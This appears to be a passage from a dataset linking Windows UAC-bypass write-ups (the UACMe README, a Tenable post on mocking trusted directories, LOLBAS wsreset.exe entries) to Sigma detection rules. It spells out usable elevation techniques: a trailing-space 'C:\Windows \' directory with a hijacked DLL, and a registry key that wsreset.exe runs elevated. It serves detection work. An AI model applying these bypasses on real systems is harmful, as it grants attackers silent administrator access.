ucmStandardAutoElevation2\n    - **Works from**: Windows 8.1 (9600)\n    - **Fixed in**: Windows 10 RS1 (14371)\n      - **How**: sysprep.exe manifest updated\n    - **Code status**: removed starting from v3.5.0 🚜\n\n18. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack (Manifest)\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\taskhost.exe, \\system32\\tzsync.exe (any ms exe without manifest)\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmAutoElevateManifest\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14371)\n      - **How**: Manifest parsing logic reviewed\n    - **Code status**: removed starting from v3.5.0 🚜\n\n19. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\inetsrv\\inetmgr.exe\n    - **Component(s)**: MsCoree.dll\n    - **Implementation**: ucmInetMgrMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS1 (14376)\n      - **How**: inetmgr.exe executable manifest hardening, MitigationPolicy->ProcessImageLoadPolicy->PreferSystem32Images\n    - **Code status**: removed starting from v3.5.0 🚜\n\n20. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\mmc.exe, Rsop.msc\n    - **Component(s)**: WbemComn.dll\n    - **Implementation**: ucmMMCMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS3 (16232)\n      - **How**: Target requires wbemcomn.dll to be signed by MS\n    - **Code status**: removed starting from v3.5.0 🚜\n\n21. **Author**: Leo Davidson derivative\n    - **Type**: Dll Hijack\n    - **Method**: IFileOperation\n    - **Target(s)**: \\system32\\inetsrv\\inetmgr.exe\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmCOMHandlersMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 19H1 (18362)\n      - **How**: Side effect of Windows changes\n    - **Code status**: removed starting from v3.5.0 🚜\n\n22. **Author**: Oddvar Moe\n    - **Type**: Elevated COM interface\n    - **Method**: ICMLuaUtil\n    - **Target(s)**: Attacker defined\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmCMLuaUtilShellExecMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: unfixed 🙈\n      - **How**: -\n    - **Code status**: added in v2.8.3\n\n23. **Author**: BreakingMalware and Enigma0x3\n    - **Type**: Elevated COM interface\n    - **Method**: IFwCplLua\n    - **Target(s)**: Attacker defined\n    - **Component(s)**: Attacker defined\n    - **Implementation**: ucmFwCplLuaMethod\n    - **Works from**: Windows 7 (7600)\n    - **Fixed in**: Windows 10 RS4 (17134)\n      - **How**: Shell API update\n    - **Code status**: removed starting from v3.5.0 🚜\n\n#### Warning\n\n- This tool shows ONLY popular UAC bypass method used by malware, and re-implement some of them in a different way improving original concepts. There are different, not yet known to the general public, methods. Be aware of this;\n- This tool is not intended for AV tests and not tested to work in aggressive AV environment, if you still plan to use it with installed bloatware AV soft - use it at your own risk;\n- Some AV may flag this tool as HackTool, MSE/WinDefender constantly marks it as malware, nope;\n- If you run this program on real computer remember to remove all program leftovers after usage, for more info about files it drops to system folders see source code;\n- Most of methods created for x64, with no x86-32 support in mind. I don't see any sense in supporting 32 bit versions of Windows or wow64, however with small tweaks most of them will run under wow64 as well.\n\nIf you wondering why this still exists and working - here is the explanation - an official Microsoft WHITEFLAG (including totally incompetent statements as bonus) link.\n\n#### Windows 10 support and testing policy\n\n- UACMe tested only with LSTB/LTSC variants (1607/1809) and Last RTM-1 versions, e.g. if current version is 2004 it will be tested on 2004 (19041) and previous version 1909 (18363);\n- Insider builds are not supported as methods may be fixed there.\n\n#### Protection\n\n- Account without administrative privileges.\n\n#### Malware usage\n\n- We do not take any responsibility for this tool usage in the malicious purposes. It is free, open-source and provided AS-IS for everyone.\n\n#### Other usage\n\n- Currently used as \"signature\" by \"THOR APT\" scanner (handmade pattern matching fraudware from Germany). We do not take any responsibility for this tool usage in the fraudware;\n- The repository link and it contents are the only genuine source for UACMe code. We have nothing to do with external links to this project, mentions anywhere as well as modifications (forks);\n- In July 2016 so-called \"security company\" Cymmetria released report about script-kiddie malware bundle called \"Patchwork\" and false flagged it as APT. They stated it was using \"UACME method\", which in fact is just slightly and unprofessionally modified injector dll from UACMe v1.9 and was using Carberp/Pitou hybrid method in malware self-implemented way. We do not take any responsibility for UACMe usage in the dubious advertising campaigns from third party \"security companies\".\n\n#### Build\n\n- UACMe comes with full source code, written in C;\n- In order to build from source you need Microsoft Visual Studio 2019 and later versions.\n\n#### Compiled Binaries\n\n- They are not provided since 2.8.9 and will never be provided in future. The reasons (and why you too should not provide them to the general public):\n  - If you look at this project in a nutshell it is a HackTool, despite initial goal to be a demonstrator. Of course several AV's detects it as HackTool (MS WD for example), however most of VirusTotal patients detects it as generic \"malware\". Which is of course incorrect, however unfortunately some lazy malware writers blindly copy-paste code to their crapware (or even simple use this tool directly) thus some AV created signatures based on project code parts;\n  - By giving compiled binaries to everyone you make life of script-kiddies much easier because having need to compile from source works as perfect barrier for exceptionally dumb script-kiddies and \"button-clickers\";\n  - Having compiled binaries in the repository will ultimately lead to flagging this repository pages as malicious (due to above reasons) by various content filters (SmartScreen, Google Safe Browsing etc).\n- This decision is a final and won't be changed.\n\n#### Instructions\n\n- Select Platform ToolSet first for project in solution you want to build (Project->Properties->General):\n  - v142 for Visual Studio 2019;\n  - v143 for Visual Studio 2022.\n- For v140 and above set Target Platform Version (Project->Properties->General):\n  - If v140 then select 8.1 (Note that Windows 8.1 SDK must be installed);\n  - If v141 and above then select 10.\n- The following SDK are required for building the binaries:\n  - Windows 8.1 or Windows 10 SDK (tested with 19041 version)\n  - NET Framework SDK (tested with 4.8 version)\n- To build working binary:\n  - Compile payload units\n  - Compile Naka module\n  - Encrypt all payload units using Naka module\n  - Generate secret blobs for these units using Naka module\n  - Move compiled units and secret blobs to the Akagi\\Bin directory\n  - Rebuild Akagi\n\n#### References\n\n- Windows 7 UAC whitelist, link\n- Malicious Application Compatibility Shims, link\n- Junfeng Zhang from WinSxS dev team blog, link\n- Beyond good ol' Run key, series of articles, link\n- KernelMode.Info UACMe thread, link\n- Command Injection/Elevation - Environment Variables Revisited, link\n- \"Fileless\" UAC Bypass Using eventvwr.exe and Registry Hijacking, link\n- Bypassing UAC on Windows 10 using Disk Cleanup, link\n- Using IARPUninstallStringLauncher COM interface to bypass UAC, link\n- Bypassing UAC using App Paths, link\n- \"Fileless\" UAC Bypass using sdclt.exe, link\n- UAC Bypass or story about three escalations, link\n- Exploiting Environment Variables in Scheduled Tasks for UAC Bypass, link\n- First entry: Welcome and fileless UAC bypass, link\n- Reading Your Way Around UAC in 3 parts:\n  1. link\n  2. link\n  3. link\n- Research on CMSTP.exe, link\n- UAC bypass via elevated .NET applications, link\n- UAC Bypass by Mocking Trusted Directories, link\n- Yet another sdclt UAC bypass, link\n- UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking, link\n- Accessing Access Tokens for UIAccess, link\n- Fileless UAC Bypass in Windows Store Binary, link\n- Calling Local Windows RPC Servers from .NET, link\n- Microsoft Windows 10 UAC bypass local privilege escalation exploit, link\n- UACMe 3.5, WD and the ways of mitigation, link\n- UAC bypasses from COMAutoApprovalList, link\n- Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses, link\n- MSDT DLL Hijack UAC bypass, link\n- UAC bypass through .Net Deserialization vulnerability in eventvwr.exe, link\n- Advanced Windows Task Scheduler Playbook - Part.2 from COM to UAC bypass and get SYSTEM directly, link\n- Bypassing UAC with SSPI Datagram Contexts, link\n- Mitigate some Exploits for Windows’® UAC, link",
    "sigma_rule": {
      "title": "UAC Bypass Using ChangePK and SLUI",
      "id": "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
      "status": "test",
      "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
      "references": [
        "https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\changepk.exe",
          "ParentImage|endswith": "\\slui.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_changepk_slui.yml",
    "id": "613"
  },
  {
    "url": "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
    "markdown": "# UAC Bypass by Mocking Trusted Directories\n\nHello Everyone,\n\nDuring research for some new User Account Control (UAC) bypass techniques, I discovered what I believe to be a new bypass method (at the time of this writing). It is worth mentioning that Microsoft doesn’t consider UAC a security boundary, however we still reported the bug to Microsoft and want to share its details here. This method was successfully tested against Windows 10 Build 17134. Before I dive into the details of the bypass, I will first offer a short primer on UAC and its quirks for those unfamiliar with some of its inner-workings.\n\n## UAC Primer\n\nWhen a user that is part of the Administrators group wants to execute a process that requires elevation, the UAC prompt is presented to confirm process elevation to the user. This UAC prompt however, is not popped for ALL administrative executables on Windows. There are a few exceptions that will “auto elevate” the target executable with no UAC prompt being thrown thus bypassing UAC (to many’s surprise!). This select group of trusted executables have additional security checks done to them to ensure they are in fact trusted so this feature is not abused by malicious actors. This approach has been used in previous UAC bypasses and will be the heart of this bypass method as well. There are a few loopholes we need to bypass for this attack to succeed however. Let’s check out some of these requirements that are enforced if we want our executable to “auto elevate”. For this, I will show some disassembly shots of appinfo.dll (the AIS service that processes elevation requests — one of the core components of UAC).\n\n## Requirement 1: File is Configured for Auto Elevation\n\nWhen a request to elevate a program occurs, an RPC call is made to AIS (appinfo.dll) with the target executable path passed as an argument. This service will then map the target executable file contents for reading. The executable’s manifest is attempted to be read in order to obtain a value for a potential “autoElevate” key (if it exists).\n\n```image\nAlt: Figure 1 — Reading Executable’s Manifest for potential “autoElevate” key\nDescription: The image displays a series of assembly code snippets, likely from a disassembly tool, illustrating the logic for handling auto elevation in the context of User Account Control (UAC) bypass. Each block of code contains instructions for checking certain conditions related to the executable's manifest and its name against a list of whitelisted executable names. The flow of operations is indicated with arrows showing possible paths based on conditional jumps, demonstrating how the system determines whether to elevate the execution of a program automatically.\nTranscription: |\n  mov [rsp+130+h+pvData], rax\n  mov [rsp+4+h+var_C8], rax\n  mov [rsp+130+h+pdwType], r8\n  mov rax, cs: LdrResSearchResource\n  test eax, eax\n  js short loc_7F81B5826C5\n  \n  lea rcx, [rbp+4+h+pActCtx] ; pActCtx\n  call cs: CreateActCtxW\n  mov r15, rax\n  cmp rax, 0FFFFFFFFFFFFFFFFh\n  jz short loc_7F81B5826C0\n  \n  mov [rsp+130+h+pcbData], rbx ; pdwWrittenOrRequired\n  lea rax, [rsp+130+h+pvBuffer]\n  mov [rsp+130+h+pvData], 8 ; dwBuffer\n  lea r9, settingName ; \"autoElevate\"\n  xor r8d, r8d ; settingsNameSpace\n  mov [rsp+130+h+pdwType], rax ; pvBuffer\n  xor rdx, r15 ; hActCtx\n  xor ecx, ecx ; dwFlags\n  call cs: QueryActCtxSettingsW\n  test eax, eax\n  jnz loc_7F81B57572D3\n```\n\nIf found and the value is “True,” it will be considered an auto elevating executable which will be ran elevated and bypass any UAC dialog (provided it passed the next requirements mentioned later). There is one exception to this “autoElevate” rule however. Regardless of manifest, if the file name itself matches one of the whitelisted EXE names, it will also be considered an “auto elevating” executable. Below you’ll see a *bsearch* call after this manifest check to see if the file name exists in a list of whitelisted executable names. If the exe name matches one of these executable names, then auto elevation will be attempted regardless of manifest.\n\n```image\nAlt: Figure 2 — bsearch call to test executable’s name against list of “auto elevating” exe names\nDescription: The image depicts a snippet of assembly code related to a function that checks if an executable's name matches a list of whitelisted executable names. The code includes various assembly instructions, such as moving data into registers and calling the 'bsearch' function to perform the search operation. The context suggests this mechanism is part of a UAC (User Account Control) bypass vulnerability, where certain executable names are considered 'auto elevating' regardless of their manifest settings.\nTranscription: |\n  loc_7FFAFCE82621:\n      mov r13, [rsp+130h+Key]\n      lea r14, PtFuncCompare\n      mov r9d, 8                       ; SizeOfElements\n      mov [rsp+130h+pdwType], r14      ; PtFuncCompare\n      lea rdx, whitelisted_exes         ; Base\n      mov rcx, r13\n      lea r8d, [r9+2]                   ; Key\n      mov [rcx], r13                    ; NumOfElements\n      call cs:bsearch\n      test rax, rax\n      jnz loc_7FFAFCE87492\n  \n  loc_7FFAFCE87492:\n      mov rdx, r12\n```\n\nA few of these hardcoded whitelisted file names are:\n\n> *‘cttunesvr.exe’, ‘inetmgr.exe’, ‘migsetup.exe’, ‘mmc.exe’, ‘oobe.exe’, ‘pkgmgr.exe’, ‘provisionshare.exe’, ‘provisionstorage.exe’, ‘spinstall.exe’, ‘winsat.exe’*\n\n## Requirement 2: Properly Signed\n\nAssuming the binary being submitted for UAC request is considered “auto elevating,” it will now do a signature check using *wintrust!WTGetSignatureInfo*. This means an attacker won’t be able to simply craft their own “autoElevating” manifest or executable file name to get auto elevation to succeed, as the attacker’s binary is most likely not properly signed and it also probably doesn’t pass the last requirement, which is Executing from Trusted Directory.\n\n## Requirement 3: Executing from Trusted Directory\n\nThe last auto elevating requirement is that the target executable resides in a “trusted directory,” such as “C:\\Windows\\System32”. Figure 3 shows AIS doing this check on a path requesting elevation, in this case one of the paths its considering “trusted” is “C:\\Windows\\System32”.\n\n```image\nAlt: Figure 3\nDescription: The image depicts a snippet of assembly code, likely from a reverse engineering tool, showing the execution flow related to checking if a target executable resides in a trusted directory, specifically 'C:\\Windows\\System32'. The code involves various operations such as loading address, bit shifting, and calling a function to prefix a Unicode string, indicating a mechanism to verify the executable path for User Account Control (UAC) elevation.\nTranscription: |\n  loc_7FFE6C6F36FE:\n      mov     ecx, ebx\n      lea     rdx, [rbp+3F0h+executablePath]\n      shl     rcx, 4\n      mov     r8b, 1\n      add     rcx, rdi ; L\"C:\\Windows\\System32\\\"\n      call    cs:RtlPrefixUnicodeString\n      test    al, al\n      jnz     short loc_7FFE6C6F371F\n```\n\nThe name of this write up is *“Bypassing UAC by Mocking Trusted Directories,”* so you can probably guess what’s coming next.\n\n# UAC Bypass\n\nAs mentioned in the UAC primer section, auto elevation (UAC bypass) will occur for executables that are:\n\n1. Configured for Auto Elevation\n2. Properly Signed\n3. Executing from a trusted directory (“C:\\Windows\\System32”).\n\nAppinfo.dll (AIS) will use *RtlPrefixUnicodeString* API to see if the target executable path begins with “C:\\Windows\\System32\\” for one of the trusted directory checks. This is pretty bullet proof check considering its comparing against the canonicalized path name of the target executable requesting elevation. So for bypassing this check, I construct a directory called “C:\\Windows \\” (notice trailing space after “Windows”). This won’t pass the *RtlPrefixUnicodeString* check of course, and I’ll also mention that this is somewhat invalid (or in the very least “unfriendly”) directory name, as Windows does not allow trailing spaces when you create a directory (try it). Using the CreateDirectory API however, and prepending a “\\\\?\\” to the directory name I want to create, we can bypass some of these naming filter rules and send the directory creation request directly to file system.\n\n```image\nAlt: Figure 4\nDescription: The image displays a snippet of code using the `CreateDirectoryW` API in a Windows environment. The code demonstrates the creation of two directories: one named 'C:\\Windows \\', which includes a trailing space, and another named 'C:\\Windows \\System32'. This code is relevant to the UAC bypass technique discussed in the accompanying context, highlighting how to create directories with unconventional naming to evade certain system checks.\nTranscription: |\n  CreateDirectoryW(L\"\\\\\\\\?\\\\C:\\\\Windows \\\\\", 0);\n  CreateDirectoryW(L\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\", 0);\n```\n\nThis results in a bit of an awkward directory happily coexisting on the filesystem alongside the real “C:\\Windows\\” (except for when you try to do anything with it in Windows Explorer).\n\nNow that we have a “C:\\Windows \\“ directory, we can create a “system32” directory in it and copy one of the signed, auto elevating executables from the real “C:\\Windows\\System32”. For this, I copied “winSAT.exe” (one of the whitelisted auto elevating Windows executables). When we attempt to run this “C:\\Windows \\System32\\winSAT.exe”, it will go through the following APIs (seen in Figure 6) in appinfo.dll before performing the trusted directory check. This is important, and core of why this bypass works.\n\n```image\nAlt: Figure 6\nDescription: The image appears to be a code snippet or diagram showing assembly instructions related to the UAC bypass technique discussed in the provided context. It includes various assembly commands and function calls, such as 'GetLongPathNameW' and 'RtlDosPathNameToRelativeNtPathName_U_WithStatus', highlighting how the execution flow progresses in the context of checking the executable path for elevation requests. The arrows and labels are likely indicating the flow of data and control between these commands, forming a visual representation of the technical process behind the UAC bypass.\nTranscription: |\n  mov r8d, edi\n  mov rdx, rax ; result = L\"C:\\\\Windows\\\\System32\\\\winSAT.exe\"\n  mov rcx, rsi ; j = L\"C:\\\\Windows\\\\System32\\\\winSAT.exe\"\n  call cs:GetLongPathNameW\n  test eax, eax\n  jz loc_7FF8266E7C61\n  \n  lea r9, [rbp+3F0h+var_2E0]\n  xor r8d, r8d\n  lea rdx, [rbp+3F0h+executablePath] ; j = L\"C:\\\\Windows\\\\System32\\\\winSAT.exe\"\n  mov rcx, rbx\n  call cs:RtlDosPathNameToRelativeNtPathName_U_WithStatus\n  test eax, eax\n  js loc_7FF8266E7C72\n```\n\nWhen this awkward path is sent to AIS for an elevation request, the path is passed to *GetLongPathNameW*, which converts it back to “C:\\Windows\\System32\\winSAT.exe” (space removed). Perfect! This is now the string that trusted directory checks are performed against (using *RtlPrefixUnicodeString*) for the rest of the routine. The beauty is that after the trusted directory check is done with this converted path string, it is then freed, and rest of checks (and final elevated execution request) are done with the original executable path name (with the trailing space). This allows all other checks to pass and results in appinfo.dll spawning my winSAT.exe copy as auto elevated (since it is both properly signed and whitelisted for auto elevation).\n\nTo actually elevate attacker code through this, I simply dropped a fake WINMM.dll (imported by winSAT.exe) in its current directory “C:\\Windows \\System32\\” for a local dll hijack. The full concept can be seen in figure below.\n\n```image\nAlt: Figure 7\nDescription: The image illustrates the process of a UAC (User Account Control) bypass technique through a flowchart. It details the steps taken to exploit the auto elevation of processes in Windows. The diagram includes elements like the `svchost.exe` process, the `Appinfo.dll` file, and various API functions such as `GetLongPathName`, `RtlPrefixUnicodeString`, and `WTGetSignatureInfo`. It shows how the exploit takes advantage of a specially crafted directory name with a trailing space to bypass security checks, ultimately leading to the execution of a malicious `WINMM.dll` file within a manipulated directory structure.\nTranscription: |\n  {\n    \"image\": {\n      \"title\": \"UAC Bypass Process\",\n      \"elements\": [\n        {\n          \"type\": \"process\",\n          \"name\": \"svchost.exe\",\n          \"connections\": [\n            {\n              \"to\": \"Appinfo.dll\",\n              \"details\": [\n                {\n                  \"api\": \"GetLongPathNameW\",\n                  \"input\": \"\\\"C:\\\\Windows \\\\System32\\\\winSAT.exe\\\"\",\n                  \"output\": \"\\\"C:\\\\Windows\\\\System32\\\\winSAT.exe\\\"\"\n                },\n                {\n                  \"api\": \"RtlPrefixUnicodeString\",\n                  \"input\": [\n                    \"\\\"C:\\\\Windows\\\\System32\\\\winSAT.exe\\\"\",\n                    \"\\\"C:\\\\Windows\\\\System32\\\\\\\"\"\n                  ],\n                  \"result\": \"Trusted directory check passed\"\n                },\n                {\n                  \"api\": \"bsearch\",\n                  \"input\": \"\\\"winSAT.exe\\\"\",\n                  \"list\": \"WHITELISTED_EXES\",\n                  \"result\": \"Whitelisted EXE check passed\"\n                },\n                {\n                  \"api\": \"WTGetSignatureInfo\",\n                  \"input\": \"\\\"C:\\\\Windows\\\\System32\\\\winSAT.exe\\\"\",\n                  \"result\": \"Signature check passed\"\n                }\n              ]\n            },\n            {\n              \"to\": \"CreateProcessAsUser\",\n              \"input\": \"\\\"C:\\\\Windows \\\\System32\\\\winSAT.exe\\\"\"\n            }\n          ]\n        },\n        {\n          \"type\": \"file\",\n          \"name\": \"UACbypass.exe\",\n          \"connections\": [\n            {\n              \"to\": \"ShellExecute\",\n              \"details\": \"invoking RPC request to Appinfo service to elevate \\\"C:\\\\Windows \\\\System32\\\\winSAT.exe\\\"\"\n            }\n          ]\n        },\n        {\n          \"type\": \"directory\",\n          \"name\": \"C:\\\\\",\n          \"subdirectories\": [\n            {\n              \"name\": \"Windows \\\\System32\",\n              \"actions\": [\n                {\n                  \"action\": \"Copy file\",\n                  \"source\": \"winSAT.exe\",\n                  \"destination\": \"Windows \\\\System32\"\n                }\n              ]\n            },\n            {\n              \"name\": \"Windows \\\\System32\",\n              \"actions\": [\n                {\n                  \"action\": \"load\",\n                  \"file\": \"WINMM.dll\",\n                  \"ownership\": \"attacker owned\"\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    }\n  }\n```\n\nGithub to POC: https://github.com/tenable/poc/tree/master/Microsoft/Windows/UACBypass",
    "sigma_rule": {
      "title": "TrustedPath UAC Bypass Pattern",
      "id": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
      "status": "test",
      "description": "Detects indicators of a UAC bypass method by mocking directories",
      "references": [
        "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
        "https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows",
        "https://github.com/netero1010/TrustedPath-UACBypass-BOF"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": "C:\\Windows \\System32\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_trustedpath.yml",
    "id": "615"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
    "markdown": "# /Wsreset.exe\n\nUsed to reset Windows Store settings according to its manifest file.\n\n### Paths:\n- `C:\\Windows\\System32\\wsreset.exe`\n\n### Resources:\n- https://www.activecyber.us/activelabs/windows-uac-bypass\n- https://twitter.com/ihack4falafel/status/1106644790114947073\n- https://github.com/hfiref0x/UACME/blob/master/README.md\n\n### Detections:\n- Sigma: proc_creation_win_uac_bypass_wsreset_integrity_level.yml\n- Sigma: proc_creation_win_uac_bypass_wsreset.yml\n- Sigma: registry_event_bypass_via_wsreset.yml\n- Splunk: wsreset_uac_bypass.yml\n- IOC: `wsreset.exe` launching child process other than `mmc.exe`\n- IOC: Creation or modification of the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command`\n- IOC: Microsoft Defender Antivirus as `Behavior:Win32/UACBypassExp.T!gen`\n\n## UAC bypass\n\nDuring startup, `wsreset.exe` checks the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` for the command to run. The binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.\n\n```\nwsreset.exe\n```\n\n**Properties:**\n- **Use case:** Execute a binary or script as a high-integrity process without a UAC prompt.\n- **Privileges required:** User\n- **Operating systems:** Windows 10, Windows 11\n- **ATT&CK® technique:** T1548.002: Bypass User Account Control",
    "sigma_rule": {
      "title": "Bypass UAC via WSReset.exe",
      "id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
      "related": [
        {
          "id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
      "references": [
        "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
        "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921"
      ],
      "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth",
      "date": "2019-10-24",
      "modified": "2022-05-13",
      "tags": [
        "attack.privilege-escalation",
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wsreset.exe"
        },
        "filter": [
          {
            "Image|endswith": "\\conhost.exe"
          },
          {
            "OriginalFileName": "CONHOST.EXE"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown sub processes of Wsreset.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset.yml",
    "id": "619"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
    "markdown": "# /Wsreset.exe\n\nUsed to reset Windows Store settings according to its manifest file.\n\n### Paths:\n- `C:\\Windows\\System32\\wsreset.exe`\n\n### Resources:\n- https://www.activecyber.us/activelabs/windows-uac-bypass\n- https://twitter.com/ihack4falafel/status/1106644790114947073\n- https://github.com/hfiref0x/UACME/blob/master/README.md\n\n### Detections:\n- Sigma: proc_creation_win_uac_bypass_wsreset_integrity_level.yml\n- Sigma: proc_creation_win_uac_bypass_wsreset.yml\n- Sigma: registry_event_bypass_via_wsreset.yml\n- Splunk: wsreset_uac_bypass.yml\n- IOC: `wsreset.exe` launching child process other than `mmc.exe`\n- IOC: Creation or modification of the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command`\n- IOC: Microsoft Defender Antivirus as `Behavior:Win32/UACBypassExp.T!gen`\n\n## UAC bypass\n\nDuring startup, `wsreset.exe` checks the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` for the command to run. The binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.\n\n```\nwsreset.exe\n```\n\n**Properties:**\n- **Use case:** Execute a binary or script as a high-integrity process without a UAC prompt.\n- **Privileges required:** User\n- **Operating systems:** Windows 10, Windows 11\n- **ATT&CK® technique:** T1548.002: Bypass User Account Control",
    "sigma_rule": {
      "title": "UAC Bypass WSReset",
      "id": "89a9a0e0-f61a-42e5-8957-b1479565a658",
      "status": "test",
      "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wsreset.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset_integrity_level.yml",
    "id": "622"
  },
  {
    "url": "https://github.com/hfiref0x/UACME",
    "markdown": "# UACMe\n\n## Folders and Files\n\n- Bin\n- Source\n- .gitattributes\n- LICENSE.md\n- README.md\n- appveyor.yml\n\n## README\n\nBuild status: build passing\n\n## UACMe\n\n### Defeating Windows User Account Control\n\n- Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor.\n\n### System Requirements\n\n- x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too).\n- Admin account with UAC set on default settings required.\n\n### Usage\n\nRun executable from command line: `akagi32 [Key] [Param]` or `akagi64 [Key] [Param]`. See \"Run examples\" below for more info.\n\nFirst parameter is number of method to use, second is optional command (executable file name including full path) to run. Second parameter can be empty - in this case program will execute elevated `cmd.exe` from `system32` folder.\n\n**Note**: Since 3.5.0 version all \"fixed\" methods are considered obsolete and removed altogether with all supporting code/units. If you still need them - use v3.2.x branch.\n\n#### Keys (click to expand/collapse)\n\n1. **Author**: Leo Davidson\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n   - **Component(s)**: cryptbase.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 7 (7600)\n   - **Fixed in**: Windows 8.1 (9600)\n     - **How**: sysprep.exe hardened LoadFrom manifest elements\n   - **Code status**: removed starting from v3.5.0 🚜\n\n2. **Author**: Leo Davidson derivative\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\sysprep\\sysprep.exe\n   - **Component(s)**: ShCore.dll\n   - **Implementation**: ucmStandardAutoElevation\n   - **Works from**: Windows 8.1 (9600)\n   - **Fixed in**: Windows 10 TP (> 9600)\n     - **How**: Side effect of ShCore.dll moving to \\KnownDlls\n   - **Code status**: removed starting from v3.5.0 🚜\n\n3. **Author**: Leo Davidson derivative by WinNT/Pitou\n   - **Type**: Dll Hijack\n   - **Method**: IFileOperation\n   - **Target(s)**: \\system32\\oobe\\setupsqm.exe\n   - **Component(s)**: WdsCore.dll\n   - **Implementation**: 